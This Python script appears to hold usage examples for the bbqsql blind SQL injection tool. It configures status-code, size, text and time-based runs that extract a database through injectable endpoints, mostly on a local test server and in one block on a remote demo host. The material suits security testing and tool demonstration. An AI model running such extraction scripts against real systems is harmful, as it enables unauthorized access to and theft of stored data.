import bbqsql
from time import time
from urllib import quote

#REMOTE STATUS CODE BASED EXAMPLE
'''
url     = bbqsql.Query('http://btoe.ws:8090/error?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code',technique='binary_search',concurrency=100)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

'''
#STATUS CODE BASED EXAMPLE
url     = bbqsql.Query('http://127.0.0.1:8090/error?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code',technique='frequency_search',concurrency=35)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

#SIZE BASED EXAMPLE
url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='size',technique='frequency_search',concurrency=3)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)

#TEXT BASED EXAMPLE
'''
url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='text',technique='frequency_search',concurrency=35)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

# TIME BASED EXAMPLE
'''
url = bbqsql.Query('http://127.0.0.1:8090/time?${query}')
query = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=.2",encoder=quote)

bh = bbqsql.BlindSQLi(url=url,query=query,comparison_attr='time',technique='binary_search',concurrency=50)
start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''
